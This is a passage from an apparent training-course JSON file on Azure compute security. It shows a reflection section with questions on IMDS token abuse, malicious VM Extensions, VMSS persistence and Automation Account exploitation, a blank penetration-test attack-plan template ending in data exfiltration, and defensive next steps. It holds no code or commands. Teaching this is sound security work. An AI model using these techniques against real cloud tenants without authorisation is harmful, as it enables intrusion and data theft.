engagementsâ€”they'll help you remember the complete Azure compute attack surface! ğŸ§ "
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "## Reflection: Mastering Azure Compute Security\n\nYou've just completed an intensive deep-dive into Azure compute exploitation. Before moving forward, take a moment to reflect on what you've learned and how you'll apply it.\n\n### Self-Assessment Questions\n\n**1. Technical Understanding**\n- Can you explain the difference between Azure control plane and data plane?\n- How does IMDS provide managed identity tokens without authentication?\n- What's the security risk of VM Extensions running as SYSTEM/root?\n- Why are VMSS attacks so powerful for lateral movement?\n- How do Automation Accounts bridge Azure and on-premises infrastructure?\n\n**2. Attack Methodology**\n- If you compromised an Azure VM tomorrow, what would be your first three actions?\n- How would you pivot from a compromised VM to accessing Azure Storage?\n- What's your strategy for establishing persistence in a VMSS environment?\n- How would you exploit an Automation Account for maximum impact?\n\n**3. Defense Strategy**\n- What's the single most effective control to prevent IMDS abuse?\n- How would you design RBAC to prevent VM Extension abuse?\n- What Azure Sentinel queries would you deploy to detect compute attacks?\n- How would you implement least privilege for managed identities?\n\n**4. Real-World Application**\n- Have you encountered similar compute security issues in your environment?\n- What's the most critical Azure compute misconfiguration in your organization?\n- How would you convince leadership to invest in compute security monitoring?\n- What's your incident response plan for a compromised Automation Account?\n\n### Hands-On Challenge\n\n**Scenario**: You're conducting a penetration test and have compromised Azure credentials with `Microsoft.Compute/virtualMachines/extensions/write` permission.\n\n**Your Task**:\n1. Design a complete attack chain from initial access to data exfiltration\n2. Identify at least 3 pivot opportunities from the compromised VM\n3. Plan persistence mechanisms that survive VM reboot and reimaging\n4. Create detection queries that would catch your attack\n5. Propose defensive controls to prevent your attack\n\n**Write Your Attack Plan**:\n```\nPhase 1: Initial Access\n- Action:\n- Tools:\n- Expected Outcome:\n\nPhase 2: Privilege Escalation\n- Action:\n- Tools:\n- Expected Outcome:\n\nPhase 3: Lateral Movement\n- Action:\n- Tools:\n- Expected Outcome:\n\nPhase 4: Persistence\n- Action:\n- Tools:\n- Expected Outcome:\n\nPhase 5: Data Exfiltration\n- Action:\n- Tools:\n- Expected Outcome:\n```\n\n### Knowledge Gaps\n\nBe honest with yourselfâ€”what topics from this lesson do you still need to practice?\n\n- [ ] Querying IMDS and retrieving managed identity tokens\n- [ ] Deploying malicious VM Extensions\n- [ ] Modifying VMSS models for persistence\n- [ ] Creating and executing Automation Account runbooks\n- [ ] Using Azure CLI/PowerShell for compute exploitation\n- [ ] Writing Azure Sentinel KQL queries for detection\n- [ ] Implementing Azure Policy for preventive controls\n- [ ] Designing least-privilege managed identity permissions\n\n**Action Plan**: For each checked item, schedule hands-on practice in a lab environment.\n\n### Connect to Your Role\n\n**If you're a Penetration Tester / Red Teamer**:\n- How will you incorporate Azure compute attacks into your methodology?\n- What tools will you add to your toolkit (Azure CLI, PowerShell, custom scripts)?\n- How will you document compute findings for maximum client impact?\n\n**If you're a Cloud Security Engineer / Blue Teamer**:\n- What monitoring gaps exist in your current Azure environment?\n- Which defensive controls can you implement this week?\n- How will you test your detections (consider purple team exercises)?\n\n**If you're a Security Architect**:\n- How does this lesson change your Azure design patterns?\n- What guardrails should be part of your cloud landing zones?\n- How will you balance security with operational flexibility?\n\n### Next Steps\n\n**Immediate Actions (This Week)**:\n1. Set up an Azure lab environment with VMs, VMSS, and Automation Accounts\n2. Practice the hands-on labs from this lesson\n3. Deploy Azure Sentinel detection rules for compute attacks\n4. Audit your organization's RBAC assignments for compute permissions\n\n**Short-Term Goals (This Month)**:\n1. Conduct a purple team exercise focused on compute security\n2. Review and harden all managed identity permissions\n3. Implement Azure Policy for VM Extension controls\n4. Create runbook approval workflow for Automation Accounts\n\n**Long-Term Mastery (This Quarter)**:\n1. Complete a full Azure environment penetration test\n2. Build custom tooling for Azure compute exploitation/defense\n3. Present Azure compute security findings to leadership\n4. Mentor others on cloud security best practices\n\n### Final Reflection\n\n**What was your biggest \"aha!\" moment in this lesson?**\n\n_Write your answer here:_\n\n\n**What will you do differently in your work after completing this lesson?**\n\n_Write your answer here:_\n\n\n**What's one thing you'll teach someone else about Azure compute security?**\n\n_Write your answer here:_\n\n\n---\n\nRemember: **The best security professionals are lifelong learners**. You've taken a major step forward in understanding Azure compute security. Now it's time to practice, experiment, and apply these skills in the real world.\n\nKeep building, keep learning, keep securing the cloud! ğŸš€"
      }
    }
  ],
  "tags": [
    "Course: SANS-SEC588",
    "Career Path: Cloud Security",
    "Career Path: Pentester",
    "Career Path: Red Teamer"
  ]
}